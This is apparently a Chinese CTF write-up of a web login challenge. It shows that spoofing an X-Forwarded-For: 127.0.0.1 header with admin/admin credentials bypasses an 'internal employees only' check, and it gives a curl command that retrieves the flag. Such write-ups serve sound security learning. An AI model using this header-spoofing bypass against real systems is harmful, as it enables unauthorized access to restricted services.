## 题解

### 入口与指纹

`Apache/2.4.25` + `PHP/5.6.40`，`Welcome to Springfield!`，POST `index.php`，
页面下方固定一行 `Access Restricted to Internal Employees only`。

### 关键观察

- 普通登录、数组、magic hash、SQLi 全部没有变化（响应恒为 3178 字节）。
- 加 `X-Forwarded-For: 127.0.0.1` 后，同样的 `admin/admin` 返回 3250 字节并带 flag。

服务端用 `X-Forwarded-For` 判断请求是否来自内网，且该头可伪造。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST -H 'X-Forwarded-For: 127.0.0.1' \
  -d 'username=admin&password=admin' "http://$T/index.php" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

放行后的页面正文。

## 复盘

- 页面出现「仅限内网」字样时，先试 `X-Forwarded-For` / `X-Real-IP`。
- 判据是响应长度变化（3178 → 3250），比盯文案更可靠。
